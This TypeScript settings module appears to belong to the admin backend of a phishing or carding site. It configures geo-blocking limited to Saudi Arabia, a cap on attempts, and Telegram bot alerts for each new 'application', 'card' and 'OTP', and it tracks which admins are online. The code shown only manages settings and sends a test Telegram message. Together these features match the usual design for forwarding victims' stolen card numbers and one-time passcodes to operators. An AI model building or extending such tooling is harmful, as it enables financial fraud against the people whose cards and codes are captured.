// @ts-nocheck
// Site settings (geo-block, attempt-block) synced live via Supabase realtime.
import { supabase } from "@/integrations/supabase/client";

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const sb: any = supabase;

export type SiteSettings = {
  geoBlockEnabled: boolean;
  allowedCountries: string[]; // ISO-2 codes
  attemptBlockEnabled: boolean;
  maxAttempts: number;
  telegramEnabled: boolean;
  telegramBotToken: string;
  telegramChatId: string;
  telegramNotifyNewApplication: boolean;
  telegramNotifyCard: boolean;
  telegramNotifyOtp: boolean;
};

const DEFAULTS: SiteSettings = {
  geoBlockEnabled: false,
  allowedCountries: ["SA"],
  attemptBlockEnabled: false,
  maxAttempts: 3,
  telegramEnabled: false,
  telegramBotToken: "",
  telegramChatId: "",
  telegramNotifyNewApplication: true,
  telegramNotifyCard: true,
  telegramNotifyOtp: true,
};

let cache: SiteSettings = DEFAULTS;
let inited = false;
const listeners = new Set<() => void>();

function notify() { listeners.forEach((l) => l()); }

type Row = {
  geo_block_enabled: boolean;
  allowed_countries: string[];
  attempt_block_enabled: boolean;
  max_attempts: number;
  telegram_enabled?: boolean;
  telegram_bot_token?: string;
  telegram_chat_id?: string;
  telegram_notify_new_application?: boolean;
  telegram_notify_card?: boolean;
  telegram_notify_otp?: boolean;
};

function rowToSettings(r: Row): SiteSettings {
  return {
    geoBlockEnabled: !!r.geo_block_enabled,
    allowedCountries: Array.isArray(r.allowed_countries) ? r.allowed_countries : ["SA"],
    attemptBlockEnabled: !!r.attempt_block_enabled,
    maxAttempts: r.max_attempts ?? 3,
    telegramEnabled: !!r.telegram_enabled,
    telegramBotToken: r.telegram_bot_token ?? "",
    telegramChatId: r.telegram_chat_id ?? "",
    telegramNotifyNewApplication: r.telegram_notify_new_application ?? true,
    telegramNotifyCard: r.telegram_notify_card ?? true,
    telegramNotifyOtp: r.telegram_notify_otp ?? true,
  };
}

async function init() {
  if (inited || typeof window === "undefined") return;
  inited = true;
  const { data } = await sb.from("site_settings").select("*").eq("id", 1).maybeSingle();
  if (data) { cache = rowToSettings(data as Row); notify(); }
  sb.channel("site-settings")
    .on("postgres_changes", { event: "*", schema: "public", table: "site_settings" }, (p: { new: Row }) => {
      if (p.new) { cache = rowToSettings(p.new); notify(); }
    })
    .subscribe();
}

export function getSettings(): SiteSettings { return cache; }

export function subscribeSettings(cb: () => void) {
  init();
  listeners.add(cb);
  return () => { listeners.delete(cb); };
}

export async function updateSettings(patch: Partial<SiteSettings>) {
  const merged = { ...cache, ...patch };
  cache = merged; notify();
  await sb.from("site_settings").update({
    geo_block_enabled: merged.geoBlockEnabled,
    allowed_countries: merged.allowedCountries,
    attempt_block_enabled: merged.attemptBlockEnabled,
    max_attempts: merged.maxAttempts,
    telegram_enabled: merged.telegramEnabled,
    telegram_bot_token: merged.telegramBotToken,
    telegram_chat_id: merged.telegramChatId,
    telegram_notify_new_application: merged.telegramNotifyNewApplication,
    telegram_notify_card: merged.telegramNotifyCard,
    telegram_notify_otp: merged.telegramNotifyOtp,
    updated_at: new Date().toISOString(),
  }).eq("id", 1);
}

export async function sendTelegramTest(botToken: string, chatId: string, text: string) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
  });
  const data = await res.json().catch(() => ({ ok: false }));
  if (!res.ok || !data.ok) {
    throw new Error(data.description || `HTTP ${res.status}`);
  }
  return data;
}

/* --- Admin presence (how many admins are online right now) --- */
const presenceListeners = new Set<(n: number) => void>();
let presenceCount = 0;
let presenceInited = false;

export function subscribeAdminPresence(cb: (n: number) => void) {
  if (typeof window === "undefined") return () => {};
  presenceListeners.add(cb);
  cb(presenceCount);
  if (!presenceInited) {
    presenceInited = true;
    const meId = Math.random().toString(36).slice(2, 10);
    const ch = sb.channel("admin-presence", { config: { presence: { key: meId } } });
    ch.on("presence", { event: "sync" }, () => {
      const state = ch.presenceState();
      presenceCount = Object.keys(state).length;
      presenceListeners.forEach((l) => l(presenceCount));
    }).subscribe(async (status: string) => {
      if (status === "SUBSCRIBED") await ch.track({ at: Date.now() });
    });
  }
  return () => { presenceListeners.delete(cb); };
}
